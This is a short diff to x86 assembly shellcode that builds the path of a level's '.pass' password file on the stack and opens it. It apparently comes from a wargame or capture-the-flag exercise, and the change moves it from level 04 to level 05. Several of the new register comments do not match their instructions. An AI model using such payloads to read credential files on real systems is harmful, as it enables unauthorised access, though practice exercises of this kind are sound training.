@@ -16,7 +16,7 @@ _start:
 	push 0x00000001
 	push 0x00000073
 	push 0x7361702e ; ssap
-	push 0x2f2f3430 ; ./40
+	push 0x2f2f3530 ; ./50
 	push 0x6c657665 ; leve
 	push 0x6c2f7372 ; l/sr
 	push 0x6573752f ; esu/
@@ -24,9 +24,9 @@ _start:
 	push 0x2f2f2f2f ; ////
 
 	xor eax, eax	; eax = 0
-	xor edx, edx	; eax = 0
-	xor ecx, ecx	; eax = 0
-	xor ebx, ebx	; eax = 0
+	xor ebx, ebx	; edx = 0
+	xor ecx, ecx	; ecx = 0
+	xor edx, edx	; ebx = 0
 
 	mov al, 5		; open number
 	mov ebx, esp	; path pointer
